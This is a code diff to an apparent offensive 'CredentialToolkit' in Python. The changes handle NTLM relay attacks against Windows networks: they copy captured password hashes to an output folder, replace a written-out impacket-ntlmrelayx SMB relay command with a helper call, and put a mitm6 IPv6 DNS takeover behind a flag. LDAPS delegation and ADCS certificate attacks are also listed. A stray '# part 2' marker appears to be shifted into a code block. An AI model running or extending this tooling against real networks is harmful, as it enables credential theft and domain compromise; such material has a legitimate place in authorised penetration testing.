@@ -280,6 +280,8 @@ class CredentialToolkit:
                     'file': str(f),
                     'hash': hash_content
                 })
+                # Copy hash file to output directory
+                shutil.copy(f, self.output_dir / 'hashes')
                 initial_files.add(f)
 
     def start_responder(self):
@@ -382,11 +384,11 @@ class CredentialToolkit:
             
             server = HTTPServer(("", self.args.port), AuditingHandler)
             server.toolkit = self  # Pass reference to toolkit for auditing
+# part 2
             server_thread = Thread(target=server.serve_forever)
             server_thread.daemon = True
             server_thread.start()
             
-# part 2
             self.print_good(f"Started HTTP server on port {self.args.port}")
             self.audit.add_event('http_server_started', {
                 'port': self.args.port,
@@ -545,9 +547,7 @@ class CredentialToolkit:
                 self.print_info("Phase 4: Starting Relay Attacks")
                 
                 # SMB relay with SOCKS
-                ntlmrelay_smb = self.run_command(
-                    'impacket-ntlmrelayx -tf targets.txt -smb2support -socks -no-http-server -no-smb-server'
-                )
+                ntlmrelay_smb = self.start_ntlmrelay()
                 logger.info("Started SMB relay with SOCKS")
                 
                 if self.args.dc_ip:
@@ -565,8 +565,8 @@ class CredentialToolkit:
             else:
                 logger.warning("No relay targets found. Skipping relay attacks.")
             
-            # 5. Start IPv6 attack if domain specified
-            if self.args.domain:
+            # 5. Start IPv6 attack if domain specified and IPv6 attacks enabled
+            if self.args.domain and self.args.ipv6:
                 self.print_info("Phase 5: Starting IPv6 Attack")
                 mitm6_proc = self.start_mitm6()
                 
@@ -588,7 +588,7 @@ class CredentialToolkit:
                 if self.args.dc_ip:
                     self.print_info("- LDAPS Delegation Attack")
                     self.print_info("- ADCS Certificate Attack")
-            if self.args.domain:
+            if self.args.domain and self.args.ipv6:
                 self.print_info("- IPv6 DNS Takeover")
             
             try:
